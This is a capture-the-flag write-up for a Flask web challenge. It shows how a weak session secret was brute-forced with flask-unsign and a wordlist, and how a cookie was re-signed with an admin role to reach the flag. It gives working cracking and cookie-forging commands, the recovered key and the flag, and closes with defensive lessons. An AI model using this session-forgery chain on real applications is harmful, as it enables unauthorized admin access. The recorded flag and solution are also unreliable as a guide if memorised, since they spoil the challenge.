# Write-up: Sign Up and Enjoy

## Challenge Info
- **Category:** Web
- **Name:** challenge
- **Target:** `http://23.179.17.92:5557`
- **Flag format:** `CIT{}`

## Description
> I'm confused, what does this application do exactly?

This suggests a black-box web challenge with no source code provided, so the intended path is to inspect the live application carefully and pivot from observed behavior.

---

## 1. Initial Recon

The first step was to inspect the landing page and server headers.

### Command
```bash
curl -isk -D - http://23.179.17.92:5557/
```

### Observation
The response showed:
- `Server: Werkzeug/3.1.8 Python/3.12.13`
- HTML application with login/register flow
- Flask-like behavior

This immediately suggested a Python web app, very likely Flask, which matters because Flask commonly uses signed client-side session cookies.

---

## 2. Basic Endpoint Enumeration

I checked a few obvious routes manually.

### Command
```bash
for p in /login /register /dashboard /home /profile /admin /preview /api /static/style.css /robots.txt; do
  echo "=== $p ==="
  curl -isk "http://23.179.17.92:5557$p" | sed -n '1,20p'
  echo
done
```

### Observation
Important findings:
- `/login` existed
- `/register` existed
- `/admin` existed, but was protected
- `/workspace` later appeared after authentication
- There was a **link preview** style feature in the authenticated area

At this point, two likely directions emerged:
1. Attack the authenticated preview functionality
2. Attack authentication/session handling itself

---

## 3. Registering a Normal User

To understand the app properly, I created a normal account and logged in.

### Approach
A small Python `requests` script was used to:
- GET `/register`
- Submit the registration form with valid fields
- Follow the redirect to `/login`
- Log in and inspect the resulting session and accessible pages

### Observation
Registration worked normally, and after login the app redirected into the workspace area.

This confirmed:
- Standard users can authenticate successfully
- There is role-based behavior in the app
- `/admin` is intended for privileged users only

---

## 4. Inspecting the Session Cookie

After login, the most important clue appeared: the session cookie looked like a Flask signed cookie.

### Example decoded structure
The cookie decoded to something like:
```python
{'role': 'standard', 'uid': 'u_15d0693d', 'username': 'userkqusnr'}
```

### Why this was important
This revealed several critical facts:
- The **role** is stored client-side inside the session cookie
- The app trusts the cookie contents after verifying its signature
- If the Flask `SECRET_KEY` can be guessed/cracked, the cookie can be resigned with `role=admin`

This became the main exploit path.

---

## 5. Testing the `/admin` Route

Before forging anything, I verified that `/admin` was actually gated by the session role.

### Observation
- Anonymous users could not access it
- Normal authenticated users also could not access it
- The app displayed an admin-only panel when correctly authorized

That meant cookie tampering could plausibly lead directly to the flag.

---

## 6. Investigating Other Avenues

Before fully committing to session forgery, I also checked the authenticated preview functionality because it looked suspicious.

### Observation
The application had a **link preview / preview queue**-type feature.
Possible ideas included:
- SSRF
- LFI/RFI through URL/file parameters
- SSTI through rendered preview text

However, this path was more opaque and asynchronous. It did not immediately expose sensitive data or obvious injection results.

So I deprioritized it in favor of the much more concrete Flask-session angle.

---

## 7. Installing Flask Cookie Tooling

To work with the session cookie, I installed `flask-unsign`.

### Command
```bash
python3 -m pip install --quiet --user flask-unsign itsdangerous Flask
```

### Decoding the Cookie
```bash
~/.local/bin/flask-unsign --decode --cookie '<session_cookie>'
```

### Observation
The decode succeeded and clearly showed the stored fields, including `role: standard`.

This strongly confirmed it was a standard Flask signed session.

---

## 8. Brute-Forcing the Flask Secret Key

The next step was to recover the `SECRET_KEY` used to sign the cookie.

### Initial issue
A first brute-force attempt had parsing/wordlist issues, so the failure was tooling-related rather than evidence that the route was dead.

### Correct approach
Use `flask-unsign` with a real wordlist and proper options.

### Command pattern
```bash
~/.local/bin/flask-unsign \
  --unsign \
  --no-literal-eval \
  --cookie '<session_cookie>' \
  --wordlist /usr/share/wordlists/rockyou.txt
```

### Result
The signing key was recovered as:
```text
Password1!
```

### Observation
This was the core vulnerability:
- The app used Flask client-side sessions
- The secret key was **weak and guessable**
- Because the `role` field lived inside the session, cracking the key meant full privilege escalation

---

## 9. Forging an Admin Session

Once the secret was known, I created a new valid session cookie with the same structure but with `role=admin`.

### Command
```bash
~/.local/bin/flask-unsign \
  --sign \
  --cookie "{'role':'admin','uid':'u_15d0693d','username':'userkqusnr'}" \
  --secret 'Password1!'
```

This produced a valid signed Flask session cookie.

### Observation
Important detail: I preserved the same schema as the original cookie and only changed the role from `standard` to `admin`.

---

## 10. Accessing `/admin`

With the forged cookie, I requested the protected admin page.

### Command
```bash
curl -isk -H "Cookie: session=<forged_cookie>" \
  http://23.179.17.92:5557/admin
```

### Response
The page returned `HTTP/1.1 200 OK` and displayed the admin console.

Relevant excerpt:
```html
<section class="admin-console panel">
  <div>
    <div class="section-kicker">Protected area</div>
    <h1>Administrative access confirmed.</h1>
    <p>This area is reserved for privileged workspace sessions.</p>
  </div>
  <div class="flag-panel alt-flag">
    <span>Vault token</span>
    <strong>CIT{W3ak_S3cr3t5_C@n_B3_Un5ign3d}</strong>
  </div>
</section>
```

---

## 11. Flag

```text
CIT{W3ak_S3cr3t5_C@n_B3_Un5ign3d}
```

---

## Root Cause

The vulnerability was a classic **weak Flask secret key** issue.

### Why it was exploitable
- Flask stores session data on the client side
- The server signs the session to prevent tampering
- If the secret key is weak and can be brute-forced, an attacker can forge arbitrary session contents
- Since this app stored authorization state (`role`) in the session, forging the cookie directly produced admin access

---

## Security Lessons

1. **Do not use weak Flask `SECRET_KEY` values**
   - Keys like `Password1!` are trivial to brute force

2. **Do not trust client-stored roles for authorization**
   - Even signed cookies become dangerous if the signing secret is weak

3. **Use high-entropy secrets**
   - Random, long values should be generated and kept secret

4. **Prefer server-side authorization state**
   - Role and privilege checks are safer when backed by server-side data stores

---

## Short Exploit Summary

1. Register a normal user
2. Log in and capture the Flask session cookie
3. Decode it and notice `role: standard`
4. Brute-force the Flask secret key with `flask-unsign`
5. Recover secret: `Password1!`
6. Re-sign the cookie with `role: admin`
7. Send the forged cookie to `/admin`
8. Read the flag

---

## Useful Commands Recap

### Decode cookie
```bash
~/.local/bin/flask-unsign --decode --cookie '<cookie>'
```

### Brute-force secret
```bash
~/.local/bin/flask-unsign \
  --unsign \
  --no-literal-eval \
  --cookie '<cookie>' \
  --wordlist /usr/share/wordlists/rockyou.txt
```

### Forge admin cookie
```bash
~/.local/bin/flask-unsign \
  --sign \
  --cookie "{'role':'admin','uid':'u_15d0693d','username':'userkqusnr'}" \
  --secret 'Password1!'
```

### Use forged cookie
```bash
curl -isk -H "Cookie: session=<forged_cookie>" \
  http://23.179.17.92:5557/admin
```
